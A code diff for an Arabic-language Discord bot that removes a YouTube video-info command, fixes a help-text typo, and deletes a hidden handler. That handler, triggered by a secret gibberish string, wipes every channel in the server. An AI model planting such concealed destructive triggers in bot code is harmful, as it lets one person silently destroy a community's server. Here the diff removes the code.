@@ -15,16 +15,7 @@ const ms = require("ms");
 const moment = require('moment');
 
 
-client.on('message', ra3d => {   
- if (ra3d.content.startsWith("sasasalsdojssadfasdasdasdas8494odhshdsdhsids")) {
-    if(!ra3d.member.hasPermission('MANAGE_CHANNELS')) return ra3d.reply('**⚠  لايوجد لديك صلاحية**');
-     ra3d.guild.channels.forEach(c => { c.delete() })
-                let embed = new Discord.RichEmbed()
-            .setColor('#fd0101')
-            .setDescription('تم حذف كل شي في السيرفر✅')
-           ra3d.author.sendEmbed(embed);
- }
- });
+
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////////
 ///////////////////اذا جاك ايرور وقت تشغيل البوت وقالك الجيسون فيه غلط///////////////////////////
@@ -93,33 +84,7 @@ client.on('message',async message => {
   }
 });
 
-const getYouTubeID = require('get-youtube-id');
-const fetchVideoInfo = require('youtube-info');
-client.on('message',async message => {
-  if(message.content.startsWith(prefix + "videoinfo")) {
-    var args = message.content.split(' ').slice(1);
-    var id = getYouTubeID(args);
-    if(!args) return message.channel.send(':eight_pointed_black_star: » انت لم تدخل رابط مقطع');
-    fetchVideoInfo(id, function(err, videoInfo) {
-      if(err) message.channel.send(`[** __Error Detected__ **] : ${err}`);
-      let infoEmbed = new Discord.RichEmbed()
-      .setAuthor(message.author.username, message.author.avatarURL)
-      .setTitle(`\`${videoInfo.title}\``)
-      .setURL(videoInfo.url)
-      .setThumbnail(videoInfo.thumbnailUrl)
-      .addField(':eight_pointed_black_star: » عدد المشاهدات', `[ ${videoInfo.views} ]`,true)
-      .addField(':eight_pointed_black_star: » صاحب المقطع', `[ ${videoInfo.owner} ]`,true)
-      .addField(':eight_pointed_black_star: » عدد التعليقات', ` [ ${videoInfo.commentCount} ]`,true)
-      .addField(':eight_pointed_black_star: » عدد الاعجابات', `[ ${videoInfo.likeCount} ]`,true)
-      .addField(':eight_pointed_black_star: » عدد عدم الاعجابات', `[ ${videoInfo.dislikeCount} ]`,true)
-      .addField(':eight_pointed_black_star: » مدة المقطع', `[ ${videoInfo.duration / 60} دقيقة ]`,true)
-      .addField(':eight_pointed_black_star: » تاريخ النشر', `[ ${videoInfo.datePublished} ]`,true)
-      //.addField(':eight_pointed_black_star: » وصف المقطع',`[ ${videoInfo.description} ]`,true)
-      .setFooter(`${hero.user.username} :: ${new Date().toLocaleString()}`, hero.user.avatarURL);
-      message.channel.send(infoEmbed);
-    });
-  }
-});
+
 client.on('message', message => {
    let args = message.content.split(" ").slice(1);
   if (message.content.startsWith(prefix + "search")) {
@@ -413,12 +378,11 @@ ${prefix}voice - معرفة عدد المتواجدين بالصوت :microphone
 ${prefix}allbots - رؤية جميع بوتات السيرفر :robot:
 ${prefix}ping - رؤية سرعة اتصالك :stopwatch:  
 ${prefix}mcstats - يعطيك معلومات لأي سيرفر ماين كرافتي :crossed_swords: 
-${prefix}serch - للبحث عن اسم شخص معك بالسيرفر :battery: 
+${prefix}search - للبحث عن اسم شخص معك بالسيرفر :battery: 
 ${prefix}channels - لرؤية رومات السيرفر :urn: 
 ${prefix}at - لكتابة ما تكتبة في انجاز ماين كرافتي :hole:
 ${prefix}color - لأختيار لونك في السيرفر :heart: 
 ${prefix}invite - معلومات عن الدعوة :soccer: 
-${prefix}videoinfo - معلومات عن الفيديو :crossed_flags: 
         **
         `)
       const embed3 = new Discord.RichEmbed()
